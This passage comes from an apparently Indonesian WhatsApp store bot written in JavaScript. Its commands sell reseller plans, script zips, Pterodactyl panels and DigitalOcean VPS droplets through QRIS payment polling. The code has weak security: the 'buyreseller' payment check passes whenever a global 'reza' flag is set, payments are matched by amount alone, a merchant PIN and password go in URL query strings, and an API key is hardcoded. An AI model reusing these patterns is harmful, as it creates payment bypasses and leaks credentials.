🌐 *Link Login*: ${global.domain}
⌛ *Created*: ${user.created_at.split("T")[0]}
🕰 *Waktu*: ${jam}
🌐 *Admin*: *True✅*
👤 *Username*: ${namalu}
`;
await Line.sendMessage(m.sender, { text: teks }, { quoted: m });
await m.reply(`*[ BERHASIL MEMBUAT ]*\n\n📆 *Tanggal*: ${tgl}\n🕰 *Waktu*: ${jam}\n📧 *Status*: *Berhasil✅*\n\n*Detail username "${namalu}" telah dikirim ke chat pribadi Anda.*`);
break;
}
}
}
break

case 'buyreseller': {
if (!db.users[m.sender]) db.users[m.sender] = { status_deposit: false };    
if (db.users[m.sender].status_deposit == true) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

let teks = `
*╔════════════════════╗*
  *Daftar Paket Reseller oleh Line*
*╚════════════════════╝*

🌐 *Pilihan Paket Reseller:*
┌───────────────────────┐
├ ▸ Reseller 10d 
├ ▸ Reseller 30d 
├ ▸ Reseller 60d 
└───────────────────────┘

*⚙️ Cara Penggunaan:*
➔ *Contoh:* \`.buyreseller 60d\`

📦 _Semua produk bergaransi dan tanpa patungan/pt²_
📝 _Pilih paket sesuai kebutuhan Anda dan ikuti petunjuk pembayaran._
🔗 _Hubungi admin jika butuh bantuan lebih lanjut._
    `;
if (!text) return m.reply(teks);

let Obj = {};
let cmd = text.toLowerCase();

if (cmd == "10d") {
Obj.paket = "Reseller 10d";
Obj.harga = "10000";
} else if (cmd == "30d") {
Obj.paket = "Reseller 30d";
Obj.harga = "15000";
} else if (cmd == "60d") {
Obj.paket = "Reseller 60d";
Obj.harga = "20000";
} else {
return m.reply(teks);
}

const login = await new Saweria().login(email_saweria, password_saweria);
if (!login || !login.data || !login.data.user_id) {
return m.reply("Gagal login ke Saweria. Mohon periksa kredensial atau coba lagi nanti.");
}

const idsaweria = login.data.user_id;
const abc = await new Saweria(idsaweria);
const Pay = await abc.createPayment(Obj.harga);
const imageQR = Buffer.from(Pay.data.qr_image.split(',')[1], 'base64');
const jam = moment.tz("Asia/Jakarta").format('HH:mm:ss');
const tgl = moment.tz("Asia/Jakarta").format('YYYY-MM-DD');

let teksqr = `
*# Berikut Status Pembayaran :*

*📦 Paket :* ${Obj.paket}
*🆔 ID :* ${Pay.data.id}
*♻️ Status :* ${Pay.data.status}
*💲 Total :* Rp${await toRupiah(Pay.data.amount)}
*⏰ Waktu :* ${jam}
*☁ Tanggal :* ${tgl}
*❌ Expired Qris :* 5 Menit

*📋 Catatan :*
 • Kode QR hanya valid untuk 1 kali transfer.
 • Setelah transfer, tunggu beberapa saat
 • Jika pembayaran berhasil, bot akan otomatis memproses pesanan
`;

let qr = await Line.sendMessage(m.chat, { image: imageQR, mimetype: "image/png", caption: teksqr }, { quoted: m });
db.users[m.sender].status_deposit = true;
let expTimeQr = setTimeout(async () => {
if (db.users[m.sender].status_deposit === true) {
db.users[m.sender].status_deposit = false;
await Line.sendMessage(m.chat, { text: "Qris pembayaran telah expired!" }, { quoted: qr });
await Line.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: qr.id, participant: m.sender } });
}
}, 300000);
let statusPay = true;
while (statusPay) {
await sleep(7000);   
if (db.users[m.sender].status_deposit === false) {
if (expTimeQr) clearTimeout(expTimeQr);
break;
}
let ress = await abc.checkPayment(Pay.data.id);
if (ress.status || global.reza) {
db.users[m.sender].status_deposit = false;
await Line.sendMessage(m.chat, { text: "Pembayaran Berhasil ☑️" }, { quoted: qr });
if (expTimeQr) clearTimeout(expTimeQr);
await Line.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: qr.id, participant: m.sender } });
const bnnd = m.sender.replace(/[^\d]/g, '');  
let res = JSON.parse(fs.readFileSync('./data/reseller.json')) || [];
res.push(bnnd);
fs.writeFileSync('./data/reseller.json', JSON.stringify(res));
await Line.sendMessage(m.chat, {
  image: { url: "https://pomf2.lain.la/f/2sot4fnj.jpg" },
  caption: `*[ BERHASIL MEMBELI PAKET ${Obj.paket.toUpperCase()} ]*\n\n📆 *Tanggal*: ${tgl}\n🕰 *Waktu*: ${jam}\n📧 *Status*: *Berhasil✅*\n\nAnda sekarang menjadi: ${Obj.paket}.\n\nBergabung dengan group dibawah ini:\nhttps://chat.whatsapp.com/IOymcrS4uFg9BBn4YA24ie`
}, { quoted: m });
break
}
}

}
break

case 'buysc':
case 'buyline':
if (!db.users[m.sender]) db.users[m.sender] = { status_deposit: false };    
if (db.users[m.sender].status_deposit == true) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
let teks = `
*╔════════════════════╗*
  *Daftar Paket Script Line*
*╚════════════════════╝*

🌐 *Pilihan Paket Script:*
┌───────────────────────┐
├ ▸ Script Paket Rendah   
├ ▸ Script Paket Standar  
├ ▸ Script Paket Premium 
└───────────────────────┘

*⚙️ Cara Penggunaan:*
➔ *Contoh:* \`.buysc rendah\`

📝 _Pilih paket sesuai kebutuhan Anda dan ikuti petunjuk pembayaran._
🔗 _Hubungi admin jika butuh bantuan lebih lanjut._
`;

if (!text) return m.reply(teks);

let Obj = {};
let cmd = text.toLowerCase();
if (cmd === "rendah") {
Obj.paket = "Script Rendah";
Obj.harga = 20000;
Obj.script = "Line Aja";
Obj.benefit = `
- Free update 3x
- Tanpa grup khusus
- Tanpa support`;
} else if (cmd === "standar") {
Obj.paket = "Script Standar";
Obj.harga = 30000;
Obj.script = "Line Aja";
Obj.benefit = `
- Free update 12x
- Tanpa grup khusus
- Support terbatas`;
} else if (cmd === "premium") {
Obj.paket = "Script Premium";
Obj.harga = 50000;
Obj.script = "Line Aja";
Obj.benefit = `
- Free update selamanya
- Grup khusus
- Support tanpa batas`;
} else {
return m.reply(teks);
}
const file = `./data/script/${Obj.script.replace(/\s/g, "_")}.zip`;
const jam = moment.tz("Asia/Jakarta").format('HH:mm:ss');
const tgl = moment.tz("Asia/Jakarta").format('YYYY-MM-DD');

const login = await new Saweria().login(email_saweria, password_saweria);
if (!login || !login.data || !login.data.user_id) {
    return m.reply("Gagal login ke Saweria. Mohon periksa kredensial atau coba lagi nanti.");
}

const idsaweria = login.data.user_id;
const saweriaInstance = new Saweria(idsaweria);
const Pay = await saweriaInstance.createPayment(Obj.harga);
const imageQR = Buffer.from(Pay.data.qr_image.split(',')[1], 'base64');

let teksqr = `
*# Berikut Status Pembayaran :*

*📦 Paket :* ${Obj.paket}
*📜 Script :* ${Obj.script}
*🆔 ID :* ${Pay.data.id}
*♻️ Status :* ${Pay.data.status}
*💲 Total :* Rp${await toRupiah(Pay.data.amount)}
*⏰ Waktu :* ${jam}
*☁ Tanggal :* ${tgl}
*🎁 Benefit :* ${Obj.benefit}
*❌ Expired Qris :* 5 Menit

*📋 Catatan :*
 • Kode QR hanya valid untuk 1 kali transfer.
 • Setelah transfer, tunggu beberapa saat.
 • Jika pembayaran berhasil, bot akan otomatis memproses pesanan.
`;

const pesan = await Line.sendMessage(m.chat, {
image: imageQR,
caption: teksqr,
mimetype: "image/png"
}, { quoted: m });

global.db.users[m.sender].saweria = {
msg: pesan,
chat: m.chat,
script: Obj.script,
file: file,
status: true,
event: function () {
setTimeout(() => {
this.status = false;
}, 300000); // 5 menit
}
};
global.db.users[m.sender].saweria.event();

let status = false;
while (!status) {
await sleep(3000);
if (!global.db.users[m.sender].saweria) break;
if (global.db.users[m.sender].saweria.status === false) {
await Line.sendMessage(m.chat, { text: "*QRIS Pembayaran Telah Expired*\nPembelian dibatalkan!" }, { quoted: m });
delete global.db.users[m.sender].saweria;
break;
}
let ress = await saweriaInstance.checkPayment(Pay.data.id);
status = ress.status;
if (ress.status) {
await Line.sendMessage(m.chat, { text: `*Pembayaran Telah Berhasil☑️*

*📦 Paket :* ${Obj.paket}
*📜 Script :* ${Obj.script}
*🆔 ID :* ${Pay.data.id}
*♻️ Status :* SUCCESS
*💲 Total :* Rp${await toRupiah(Pay.data.amount)}
*⏰ Waktu :* ${jam}
*☁ Tanggal :* ${tgl}
*🎁 Benefit :* ${Obj.benefit}

_Terima kasih telah membeli produk *Line Official*! Semoga jadi langganan :)_` }, { quoted: m });

await Line.sendMessage(m.sender, {
document: fs.readFileSync(global.db.users[m.sender].saweria.file),
caption: `*# Script ${Obj.script}*\nKetik *.owner* untuk meminta join ke grup info update.`,
fileName: `${Obj.script}.zip`,
mimetype: "application/zip"
}, { quoted: m });
delete global.db.users[m.sender].saweria;
break;
}
}
break

case "batalbeli": {
if (!db.users[m.sender].status_deposit) return;
db.users[m.sender].status_deposit = false;
if (m.key && m.key.remoteJid) {
await Line.sendMessage(m.key.remoteJid, { delete: m.key });
}
await m.reply("Berhasil membatalkan transaksi ☑️");
}
break

//Orkut menu
case 'deposito': {
if (m.isGroup) return reply("Deposit hanya bisa dilakukan di private chat!");
if (!db.users[m.sender]) {
db.users[m.sender] = { status_deposit: false, saweria: null };
}
if (typeof db.users[m.sender].status_deposit === "undefined") {
db.users[m.sender].status_deposit = false;
}
if (db.users[m.sender].status_deposit === true) {
return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.bataldeposit* untuk membatalkan transaksi sebelumnya!");
}
let teks = `
➔ *Contoh:* \`.deposito jumlah\`
`;
if (!text) return m.reply(teks);
let input = text.split(",");
let amount = input[0] ? parseInt(input[0].trim()) : null;
if (!amount || amount < 1000) 
return reply("Minimal deposit adalah Rp1000. Contoh: .deposit 1000");
function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}
let totalAmount = amount + generateRandomNumber(10, 200);
const get = await axios.get(`https://lineaja.my.id/api/orkut/createpayment?apikey=linebaik&amount=${totalAmount}&codeqr=${global.codeqr}`);
let teks3 = `
*▧ INFORMASI PEMBAYARAN*

 *• 🆔 ID :* ${get.data.result.transactionId}
 *• 💸 Total Pembayaran :* Rp${await toRupiah(get.data.result.amount)}
 *• ⏰ Expired :* 5 menit

*📌 Catatan Penting:*
*Pembayaran melalui QRIS hanya berlaku selama 5 menit.*

*🔔 Cara Membatalkan:*
Ketik .bataldeposit jika Anda ingin membatalkan transaksi ini.
`;
let msgQr = await Line.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teks3 }, { quoted: m });
db.users[m.sender].status_deposit = true;
db.users[m.sender].saweria = {
msg: msgQr,
chat: m.sender,
idDeposit: get.data.result.transactionId,
amount: get.data.result.amount.toString(),
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit === true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Line.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
await Line.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
db.users[m.sender].status_deposit = false;
delete db.users[m.sender].saweria;
}
}, 300000);
}
};
await db.users[m.sender].saweria.exp();
while (db.users[m.sender].status_deposit === true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(15000);
const resultcek = await axios.get(`https://lineaja.my.id/api/orkut/cekstatus?apikey=linebaik&merchant=${global.merchant}&keyorkut=${global.keyorkut}`);
const req = await resultcek.data.amount;
if (db.users[m.sender].saweria && req == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false;
await Line.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
await Line.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL ☑️*

 *• 🆔 ID :* ${db.users[m.sender].saweria.idDeposit}
 *• 💸 Total Pembayaran :* Rp${await toRupiah(db.users[m.sender].saweria.amount)}
 *• ♻️ Payment :* ${resultcek.data.brand_name}

Saldo Anda akan segera diproses.
` }, { quoted: db.users[m.sender].saweria.msg });
db.users[m.sender].saldo = (db.users[m.sender].saldo || 0) + parseInt(db.users[m.sender].saweria.amount);
}
}
break
}
break

case "cekmutasi":
case "mutasi": {
Line.sendMessage(from, { react: { text: "🔎", key: m.key } });
try {
const apiUrl = `https://gateway.okeconnect.com/api/mutasi/qris/${global.merchant}/${global.keyorkut}`;
const response = await axios.get(apiUrl);
const result = response.data;
const latestTransaction = result.data && result.data.length > 0 ? result.data[0] : null;
if (latestTransaction) {
const caption = `*[ MUTASI TRANSAKSI ]*\n\n` +
`Tanggal Trx: ${latestTransaction.date}\n` +
`Nominal: Rp${latestTransaction.amount}\n` +
`Jenis: ${latestTransaction.type}\n` +
`QRIS: ${latestTransaction.qris}\n` +
`Nama Brand: ${latestTransaction.brand_name}\n` +
`Issuer Ref: ${latestTransaction.issuer_reff}\n` +
`Buyer Ref: ${latestTransaction.buyer_reff}\n` +
`Saldo Tersisa: Rp${latestTransaction.balance}\n\n` +
`Informasi ini adalah hasil dari mutasi transaksi terakhir.`;
Line.sendMessage(m.chat, { text: caption }, { quoted: m });
} else {
reply("Gagal mendapatkan informasi transaksi. Coba lagi nanti.");
}
} catch (error) {
console.error("Error saat mengecek mutasi transaksi:", error);
reply("Terjadi kesalahan saat mengecek mutasi transaksi.");
}
}
break

case 'ceksaldo': {
const saldonya = await fetchJson(`https://h2h.okeconnect.com/trx/balance?memberID=${global.merchant}&pin=${pin}&password=${pw}`)
Line.sendMessage(m.chat, { text: `sisa saldo akun : ${saldonya}`})
}
break

case 'buyproduko': {
if (m.isGroup) return reply("Beli produk hanya bisa di private chat !");
if (!db.users[m.sender]) {
db.users[m.sender] = { status_deposit: false, saweria: null }; 
}
if (typeof db.users[m.sender].status_deposit === "undefined") {
db.users[m.sender].status_deposit = false;
}
if (db.users[m.sender].status_deposit === true) {
return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
}
let teks = `
*╔════════════════════╗*
  *Daftar Produk Disediakan oleh Line*
*╚════════════════════╝*

🌐 *Pilihan Produk Nya Om:*
┌───────────────────────┐
├ ▸ Admin Panel (adp)
├ ▸ Owner Panel (ownpanel)
├ ▸ Partner Panel (ptpanel)
└───────────────────────┘

*⚙️ Cara Penggunaan:*
➔ *Contoh:* \`.buyproduk adp,username,password\`

📝 _Pilih paket sesuai kebutuhan Anda dan ikuti petunjuk pembayaran._
🔗 _Hubungi admin jika butuh bantuan lebih lanjut._
`;
if (!text) return m.reply(teks);
let input = text.split(",");
let cmd = input[0].toLowerCase();
let namalu = input[1] ? input[1].trim() : null;
let passwordUser = input[2] ? input[2].trim() : null;
if (!namalu) 
return reply("Example : .buyproduk adp,username,password");
if (passwordUser && (passwordUser.length < 6 || passwordUser.length > 20)) {
return m.reply("Password harus memiliki panjang antara 6-20 karakter.");
}
let produkOptions = {
adp: { paket: "Admin Panel", harga: "1000" },
ptpanel: { paket: "Partner Panel", harga: "35000" },
ownpanel: { paket: "Owner Panel", harga: "45000" }
};
let Obj = produkOptions[cmd];
if (!Obj) return m.reply(teks);
function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}
let amount = Number(Obj.harga) + generateRandomNumber(10, 200);
const get = await axios.get(`https://lineaja.my.id/api/orkut/createpayment?apikey=linebaik&amount=${amount}&codeqr=${global.codeqr}`);  
let teks3 = `
*▧ INFORMASI PEMBAYARAN*

 *• 🆔 ID :* ${get.data.result.transactionId}
 *• 💸 Total Pembayaran :* Rp${await toRupiah(get.data.result.amount)}
 *• 📦 Product :* ${Obj.paket}
 *• ⏰ Expired :* 5 menit

*📌 Catatan Penting:*
*Pembayaran melalui QRIS hanya berlaku selama 5 menit.*

*🔔 Cara Membatalkan:*
*Ketik .batalbeli jika Anda ingin membatalkan transaksi ini.*
`;
let msgQr = await Line.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teks3 }, { quoted: m });
db.users[m.sender].status_deposit = true;
db.users[m.sender].saweria = {
msg: msgQr,
chat: m.sender,
idDeposit: get.data.result.transactionId,
amount: get.data.result.amount.toString(),
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit === true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Line.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
await Line.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
db.users[m.sender].status_deposit = false;
delete db.users[m.sender].saweria;
}
}, 300000);
}
};
await db.users[m.sender].saweria.exp();
while (db.users[m.sender].status_deposit === true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(15000);
const resultcek = await axios.get(`https://lineaja.my.id/api/orkut/cekstatus?apikey=linebaik&merchant=${global.merchant}&keyorkut=${global.keyorkut}`);
const req = await resultcek.data.amount;
if (db.users[m.sender].saweria && req == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false;
await Line.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
await Line.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL ☑️*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toRupiah(db.users[m.sender].saweria.amount)}
 *• Product :* ${Obj.paket}
 *• Payment :* ${resultcek.data.brand_name}
` }, { quoted: db.users[m.sender].saweria.msg });
let email = namalu + "@vcloudx.me";
let name = kapital(namalu);
let password = passwordUser ? passwordUser : namalu + crypto.randomBytes(2).toString("hex");
let f = await fetch(`${global.domain}` + "/api/application/users", {
method: "POST",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
body: JSON.stringify({
email: email,
username: namalu,
first_name: name,
last_name: Obj.paket.replace(" ", ""),
root_admin: true,
language: "en",
password: password
})
});
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes;
let teks = `
[ *Your ${Obj.paket.toUpperCase()} Data ☑️* ]

• *🆔 ID:* ${user.id}
• *📧 Email:* ${email}
• *👤 Nama:* ${user.first_name}
• *🔐 Password:* ${password}
• *🔗 Login:* ${global.domain}
`;
await Line.sendMessage(m.sender, { text: teks }, { quoted: m });
await reply(`*[ Successful purchase ${Obj.paket.toUpperCase()} ☑️ ]*\n\n*Silahkan masuk group support!*`);
}
}
break;
}
break

case 'buypanelor': case 'buypanelo': {
if (m.isGroup) return reply("Beli produk hanya bisa di private chat !");
if (!db.users[m.sender]) {
db.users[m.sender] = { status_deposit: false, saweria: null }; 
}
if (typeof db.users[m.sender].status_deposit === "undefined") {
db.users[m.sender].status_deposit = false;
}
if (db.users[m.sender].status_deposit === true) {
return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
}
let teks = `
*╔════════════════════╗*
  *Daftar Panel Private oleh Line*
*╚════════════════════╝*

🌐 *Pilihan Paket Panel:*
┌───────────────────────┐
├ ▸ 1GB  
├ ▸ 2GB   
├ ▸ 3GB   
├ ▸ 4GB   
├ ▸ 5GB   
├ ▸ 6GB   
├ ▸ 7GB   
├ ▸ 8GB   
├ ▸ 9GB   
├ ▸ 10GB   
└ ▸ Unlimited 
└───────────────────────┘

*⚙️ Cara Penggunaan:*
➔ *Contoh:* \`.buypanel 2gb,username,password\`

📝 _Pilih paket sesuai kebutuhan Anda dan ikuti petunjuk penggunaan._
🔗 _Hubungi admin jika butuh bantuan lebih lanjut._
`;
if (!text || text.split(',').length < 3) 
return m.reply(teks);
let [paket, username, password] = text.split(',');
paket = paket.toLowerCase().trim();
username = username.trim();
password = password.trim();
if (!username || !password) 
return m.reply("Harap masukkan username dan password yang valid.");
const panelOptions = {
"1gb": { ram: "1024", disk: "1024", cpu: "40", harga: "1000" },
"2gb": { ram: "2048", disk: "2048", cpu: "60", harga: "3000" },
"3gb": { ram: "3072", disk: "3072", cpu: "80", harga: "4000" },
"4gb": { ram: "4048", disk: "4048", cpu: "100", harga: "5000" },
"5gb": { ram: "5120", disk: "5120", cpu: "120", harga: "6000" },
"6gb": { ram: "6144", disk: "6144", cpu: "140", harga: "7000" },
"7gb": { ram: "7168", disk: "7168", cpu: "160", harga: "8000" },
"8gb": { ram: "8248", disk: "8248", cpu: "180", harga: "9000" },
"9gb": { ram: "9148", disk: "9148", cpu: "200", harga: "10000" },
"10gb": { ram: "10048", disk: "10048", cpu: "220", harga: "11000" },
"unlimited": { ram: "0", disk: "0", cpu: "0", harga: "13000" }
};
if (!panelOptions[paket]) return m.reply(teks);
const Obj = panelOptions[paket];
if (!Obj) return m.reply(teks);
function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}
let amount = Number(Obj.harga) + generateRandomNumber(10, 200);
const get = await axios.get(`https://lineaja.my.id/api/orkut/createpayment?apikey=linebaik&amount=${amount}&codeqr=${global.codeqr}`);  
let teks3 = `
*▧ INFORMASI PEMBAYARAN*

 *• 🆔 ID :* ${get.data.result.transactionId}
 *• 💸 Total Pembayaran :* Rp${await toRupiah(get.data.result.amount)}
 *• 📦 Product :* Panel Ptreo
 *• ⏰ Expired :* 5 menit

*📌 Catatan Penting:*
*Pembayaran melalui QRIS hanya berlaku selama 5 menit.*

*🔔 Cara Membatalkan:*
*Ketik .batalbeli jika Anda ingin membatalkan transaksi ini.*
`;
let msgQr = await Line.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teks3 }, { quoted: m });
db.users[m.sender].status_deposit = true;
db.users[m.sender].saweria = {
msg: msgQr,
chat: m.sender,
idDeposit: get.data.result.transactionId,
amount: get.data.result.amount.toString(),
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit === true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Line.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
await Line.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
db.users[m.sender].status_deposit = false;
delete db.users[m.sender].saweria;
}
}, 300000);
}
};
await db.users[m.sender].saweria.exp();
while (db.users[m.sender].status_deposit === true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(15000);
const resultcek = await axios.get(`https://lineaja.my.id/api/orkut/cekstatus?apikey=linebaik&merchant=${global.merchant}&keyorkut=${global.keyorkut}`);
const req = await resultcek.data.amount;
if (db.users[m.sender].saweria && req == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false;
await Line.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
await Line.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL ☑️*

 *• 🆔 ID :* ${db.users[m.sender].saweria.idDeposit}
 *• 💸 Total Pembayaran :* Rp${await toRupiah(db.users[m.sender].saweria.amount)}
 *• 📦 Product :* Panel Ptreo
 *• ♻️ Payment :* ${resultcek.data.brand_name}
` }, { quoted: db.users[m.sender].saweria.msg });
const email = `${username}@gmail.com`;
let name = kapital(username) + "Line";
let f = await fetch(`${global.domain}/api/application/users`, {
method: "POST",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
body: JSON.stringify({
email: email,
username: username,
first_name: name,
last_name: "LinexCloud",
language: "en",
password: password
})
});
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let desc = `${penghitung}`
let usr_id = user.id
let f1 = await fetch(`${global.domain}` + `/api/application/nests/5/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(`${global.domain}` + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = data.attributes;
var orang = m.chat
var tekspanel = `
*Successfully Created Panel Account ☑️*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${Obj.ram == "0" ? "Unlimited" : Obj.ram + "MB"}
* *Cpu :* ${Obj.cpu == "0" ? "Unlimited" : Obj.cpu + "%"}
* *Disk :* ${Obj.disk == "0" ? "Unlimited" : Obj.disk + "MB"}

*Rules Pembelian Panel ⚠️*
- Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
- Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
- Garansi Aktif 30 Hari.
`;
await Line.sendMessage(m.chat, { text: tekspanel }, { quoted: m });
break;
}
}
}
break

case 'buyvps':
if (m.isGroup) return reply("Beli produk hanya bisa di private chat !");
if (!db.users[m.sender]) {
db.users[m.sender] = { status_deposit: false, saweria: null }; 
}
if (typeof db.users[m.sender].status_deposit === "undefined") {
db.users[m.sender].status_deposit = false;
}
if (db.users[m.sender].status_deposit === true) {
return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
}
let civi = `
 *乂 List Paket VPS yang Tersedia*
 
*1.* Ram 2 & Cpu 1
*Harga Rp25.000*

*2.* Ram 4 & Cpu 2
*Harga Rp35.000*

*3.* Ram 8 & Cpu 4
*Harga Rp45.000*

*4.* Ram 16 & Cpu 4
*Harga Rp55.000*

 Contoh penggunaan : *.buyvps* 1,hostname,password
`;
if (!text) return m.reply(civi);
let [paketId, hostname, password] = text.split(",");
if (!paketId || !hostname || !password) {
return m.reply("Format tidak valid! Contoh penggunaan: *.buyvps* 1,hostname,password");
}
hostname = hostname.toLowerCase().trim();
password = password.trim();
if (!hostname.match(/^[a-zA-Z0-9-]+$/)) {
return m.reply("Hostname hanya boleh menggunakan huruf, angka, dan tanda hubung (-).");
}
if (password.length < 8) {
return m.reply("Password harus memiliki panjang minimal 8 karakter.");
}
let paket = {
"1": { ram: "2GB", cpu: "1", harga: 25000, size: "s-1vcpu-2gb" },
"2": { ram: "4GB", cpu: "2", harga: 35000, size: "s-2vcpu-4gb" },
"3": { ram: "8GB", cpu: "4", harga: 45000, size: "s-4vcpu-8gb" },
"4": { ram: "16GB", cpu: "4", harga: 55000, size: "s-4vcpu-16gb-amd" },
};
let choice = paket[paketId];
if (!choice) return m.reply("Pilihan tidak valid! Silakan pilih sesuai daftar.");
let generateRandomNumber = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
let amount = choice.harga + generateRandomNumber(10, 200);
const get = await axios.get(`https://lineaja.my.id/api/orkut/createpayment?apikey=linebaik&amount=${amount}&codeqr=${global.codeqr}`);  
let teks3 = `
*▧ INFORMASI PEMBAYARAN*

 *• 🆔 ID :* ${get.data.result.transactionId}
 *• 💸 Total Pembayaran :* Rp${await toRupiah(get.data.result.amount)}
 *• 📦 Product :* VPS ${choice.ram} RAM & ${choice.cpu} CPU
 *• ⏰ Expired :* 5 menit

*📌 Catatan Penting:*
*Pembayaran melalui QRIS hanya berlaku selama 5 menit.*

*🔔 Cara Membatalkan:*
*Ketik .batalbeli jika Anda ingin membatalkan transaksi ini.*
`;
let msgQr = await Line.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teks3 }, { quoted: m });
db.users[m.sender].status_deposit = true;
db.users[m.sender].saweria = {
msg: msgQr,
chat: m.sender,
idDeposit: get.data.result.transactionId,
amount: get.data.result.amount.toString(),
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit) {
await Line.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
await Line.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
db.users[m.sender].status_deposit = false;
delete db.users[m.sender].saweria;
}
}, 300000);
}
};
await db.users[m.sender].saweria.exp();
while (db.users[m.sender].status_deposit) {
await sleep(15000);
const resultcek = await axios.get(`https://lineaja.my.id/api/orkut/cekstatus?apikey=linebaik&merchant=${global.merchant}&keyorkut=${global.keyorkut}`);
const req = await resultcek.data.amount;
if (req == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false;
await Line.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
await Line.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL ☑️*

 *• 🆔 ID :* ${db.users[m.sender].saweria.idDeposit}
 *• 💸 Total Pembayaran :* Rp${await toRupiah(db.users[m.sender].saweria.amount)}
 *• 📦 Product :* VPS ${choice.ram} RAM & ${choice.cpu} CPU
 *• ♻️ Payment :* ${resultcek.data.brand_name}
` }, { quoted: db.users[m.sender].saweria.msg });
let dropletData = {
name: hostname,
region: "sgp1",
size: choice.size,
image: 'ubuntu-20-04-x64',
backups: false,
ipv6: true,
user_data: `#cloud-config
password: ${password}
chpasswd: { expire: False }
ssh_pwauth: True`,
private_networking: null,
volumes: null,
tags: ['T']
};
try {
let response = await fetch('https://api.digitalocean.com/v2/droplets', {
